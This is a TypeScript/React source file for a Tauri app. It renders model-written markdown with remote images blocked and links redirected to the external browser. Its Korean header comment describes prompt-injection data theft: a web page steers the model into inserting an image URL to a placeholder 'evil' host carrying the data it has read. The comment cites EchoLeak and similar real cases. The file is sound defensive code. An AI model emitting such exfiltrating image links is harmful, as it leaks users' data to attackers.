import type { Components } from "react-markdown";
import { invoke } from "@tauri-apps/api/core";

/**
 * 모델이 쓴 마크다운을 그릴 때의 안전 장치.
 *
 * 마크다운 이미지는 **클릭 없이** 로드된다. 웹페이지에 조종당한 모델이
 * `![x](https://evil/?d=읽은내용)` 을 답에 끼워 넣으면 그 한 줄로 데이터가 나간다 —
 * ChatGPT·Copilot(EchoLeak)·Slack AI 가 실제로 당한 경로다. 그래서 원격 이미지는 그리지
 * 않고 자리 표시만 남긴다. 앱이 만든 이미지(data:/blob:/asset:)는 그대로 보인다.
 *
 * 링크는 앱 창 안에서 열리면 안 된다(그 페이지의 스크립트가 앱의 IPC 를 가진 창에서
 * 돈다). 가로채서 바깥 브라우저로 보내되 http(s) 만 — Rust 가 한 번 더 검사한다.
 */

const LOCAL_IMAGE = /^(data:image\/|blob:|asset:|https?:\/\/asset\.localhost\/)/i;

export function isLocalImageSrc(src: string | undefined | null): boolean {
  return !!src && LOCAL_IMAGE.test(src);
}

export function isExternalHttpUrl(href: string | undefined | null): boolean {
  return !!href && /^https?:\/\//i.test(href);
}

export function openExternal(href: string): void {
  if (!isExternalHttpUrl(href)) return;
  invoke("open_external_url", { url: href }).catch(() => {});
}

/** react-markdown 의 `components` 에 그대로 넘긴다. 표 래퍼는 호출하는 쪽이 덧붙인다. */
export const safeMarkdownComponents: Components = {
  img: ({ src, alt }) => {
    const s = typeof src === "string" ? src : "";
    if (isLocalImageSrc(s)) return <img src={s} alt={alt ?? ""} />;
    // 주소는 글자로만 보인다. 링크도 이미지도 아니다.
    return (
      <span className="md-blocked-image" title={s || undefined}>
        🖼 {alt?.trim() ? alt : "원격 이미지"} (표시 안 함)
      </span>
    );
  },
  a: ({ href, children }) => {
    const h = typeof href === "string" ? href : "";
    const external = isExternalHttpUrl(h);
    return (
      <a
        href={external ? h : undefined}
        onClick={(e) => {
          e.preventDefault();
          if (external) openExternal(h);
        }}
      >
        {children}
      </a>
    );
  },
};

/**
 * 문서 전체의 `<a>` 클릭을 가로챈다. 마크다운 컴포넌트를 안 거친 링크(업데이트 노트,
 * 요약 바, 앞으로 생길 곳)까지 한 번에 덮는다. 네비게이션 자체는 Rust 의 navguard 가
 * 막지만, 사용자에겐 "눌렀는데 아무 일도 없음" 보다 바깥 브라우저가 열리는 게 맞다.
 */
export function installGlobalLinkGuard(): () => void {
  const onClick = (e: MouseEvent) => {
    if (e.defaultPrevented) return;
    const a = (e.target as HTMLElement | null)?.closest?.("a[href]") as HTMLAnchorElement | null;
    if (!a) return;
    const href = a.getAttribute("href") ?? "";
    if (href.startsWith("#")) return;
    e.preventDefault();
    if (isExternalHttpUrl(href)) openExternal(href);
  };
  document.addEventListener("click", onClick, true);
  return () => document.removeEventListener("click", onClick, true);
}
